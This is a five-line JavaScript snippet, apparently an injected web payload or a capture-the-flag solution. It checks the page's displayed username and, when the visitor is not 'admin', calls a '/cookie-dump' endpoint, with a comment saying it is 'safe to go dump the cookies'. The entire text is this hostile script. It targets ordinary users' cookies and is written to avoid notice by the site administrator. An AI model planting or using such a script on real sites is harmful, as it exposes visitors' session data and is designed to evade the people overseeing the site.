const username = document.getElementById("username").textContent;
if (username !== "admin") {
    // Since we are not the admin, it's safe to go dump the cookies
    fetch("/cookie-dump");
}